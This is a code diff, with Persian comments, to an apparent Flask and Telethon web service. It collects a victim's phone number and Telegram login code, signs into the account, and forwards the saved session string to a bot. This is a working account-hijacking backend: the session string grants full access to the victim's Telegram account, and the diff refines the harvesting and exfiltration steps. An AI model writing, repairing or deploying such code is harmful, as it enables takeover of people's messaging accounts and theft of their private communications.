@@ -30,7 +30,7 @@ def request_code():
         return jsonify({'error': 'Phone required'}), 400
 
     session_id = f"session_{phone.replace('+', '')}"
-    sessions[session_id] = {'phone': phone, 'status': 'pending', 'client': None}
+    sessions[session_id] = {'phone': phone, 'status': 'pending'}
 
     try:
         loop.run_until_complete(send_code(session_id, phone))
@@ -65,17 +65,22 @@ def verify_code():
         return jsonify({'error': str(e)}), 500
 
 # ============================================================
-# توابع جدید با متد start
+# توابع با متد start
 # ============================================================
 async def send_code(session_id, phone):
     try:
+        # ساخت کلاینت جدید
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
-        # فقط درخواست کد رو می‌فرستیم، هنوز لاگین نمی‌کنیم
+        
+        # ارسال درخواست کد
         await client.send_code_request(phone)
+        
+        # ذخیره کلاینت برای مرحله بعد
         sessions[session_id]['client'] = client
         sessions[session_id]['status'] = 'code_sent'
         logging.info(f"✅ Code sent to: {phone}")
+        
     except Exception as e:
         sessions[session_id]['status'] = 'error'
         logging.error(f"❌ Error sending code: {e}")
@@ -92,14 +97,15 @@ async def verify_session(session_id, phone, code):
         return False
 
     try:
-        # ✅ استفاده از متد start که خودش همه‌چیز رو مدیریت میکنه
+        # ✅ استفاده از start برای لاگین کامل
         await client.start(phone=phone, password=code)
-        # بعد از start، کاربر لاگین شده و سشن ذخیره میشه
+        
+        # بعد از لاگین، سشن رو بگیر
         session_string = client.session.save()
-
-        # ارسال سشن به ربات
+        
+        # ارسال به ربات
         await send_to_bot(f"User : {phone}\nکد سیشن : {session_string}")
-
+        
         sessions[session_id]['status'] = 'done'
         await client.disconnect()
         logging.info(f"✅ Session saved for: {phone}")
@@ -108,9 +114,10 @@ async def verify_session(session_id, phone, code):
     except Exception as e:
         sessions[session_id]['status'] = 'error'
         logging.error(f"❌ Verification error: {e}")
-        # خطاهای مربوط به کد اشتباه رو تشخیص بده
+        
+        # تشخیص خطاهای مربوط به کد اشتباه
         error_msg = str(e).lower()
-        if 'code' in error_msg or 'invalid' in error_msg or 'phone' in error_msg:
+        if 'code' in error_msg or 'invalid' in error_msg:
             return False
         raise
 
